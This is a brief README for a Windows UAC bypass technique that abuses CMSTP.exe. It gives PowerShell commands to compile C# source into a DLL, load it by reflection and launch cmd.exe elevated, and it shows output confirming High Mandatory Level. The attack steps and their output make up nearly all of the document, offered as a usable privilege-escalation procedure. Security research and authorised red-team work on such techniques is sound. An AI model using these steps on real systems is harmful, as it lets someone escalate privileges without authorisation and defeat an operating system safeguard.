# UAC Bypass - CMSTP

Use CMSTP.exe to bypass UAC. All credits go to zc00l: https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html

The C# code can be compiled locally using PowerShell:

```Add-Type -TypeDefinition ([IO.File]::ReadAllText("C:\Temp\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "C:\Temp\test.dll"```

This DLL can be loaded directly into PowerShell using Reflection.Assembly:

```[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("C:\Temp\test.dll"))```

Then each elevated command can be successfully executed:

```
[CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe")

> whoami /groups
--snip--
Mandatory Label\High Mandatory Level
```
